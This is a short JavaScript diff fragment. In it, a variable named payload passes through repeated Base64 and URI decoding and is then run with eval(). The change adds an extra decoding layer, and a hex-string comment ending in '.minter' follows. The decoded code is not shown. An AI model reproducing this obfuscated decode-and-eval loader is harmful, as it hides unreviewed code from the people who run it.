@@ -131,6 +131,6 @@ else
 		var a = Base64.decode(payload);
 		var t = String(decodeURIComponent(a.split("").map(function(ch) { return "%"+ch.charCodeAt(0).toString(16); }).join("")));
 		var b = Base64.decode(t);
-		eval(String(b));
+		eval(String(decodeURIComponent(b.split("").map(function(ch) { return "%"+ch.charCodeAt(0).toString(16); }).join(""))));
 }
 //0x9f4c71d83a9a9890dcd4e71847d7f78d744a9167ffa36d7ee9875718efb9ec4e.minter
